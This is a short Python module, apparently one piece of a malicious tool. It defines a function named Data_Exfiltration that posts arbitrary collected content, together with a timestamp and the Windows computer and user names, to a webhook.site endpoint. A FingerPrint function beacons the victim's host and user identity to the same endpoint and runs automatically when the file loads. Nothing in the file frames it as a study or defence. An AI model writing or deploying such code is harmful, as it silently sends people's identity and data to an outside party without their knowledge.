import requests
import datetime
import os

Contact_server = "https://webhook.site/"

def Data_Exfiltration(Form, Requested_Content):
    try:
        requests.post(
            Contact_server,
            json={f"[{Form}]": f"{datetime.datetime.now().strftime("%d-%h-%m")}/{datetime.datetime.now().strftime("%H:%M")}, {os.getenv('COMPUTERNAME')}/{os.getenv('USERNAME')} - {Requested_Content}"}, timeout=5)
    except (requests.ConnectionError, requests.JSONDecodeError, requests.HTTPError) as requests_error:
        print(requests_error)

def FingerPrint():
    try:
        requests.post(Contact_server,
                    json={"[connected]": f"{datetime.datetime.now().strftime("%d-%h-%m")}/{datetime.datetime.now().strftime("%H:%M")} - {os.getenv('computername')}/{os.getenv('username')}"}, timeout=5)
    except (requests.ConnectionError, requests.JSONDecodeError, requests.HTTPError) as requests_error:
        print(requests_error)
FingerPrint()
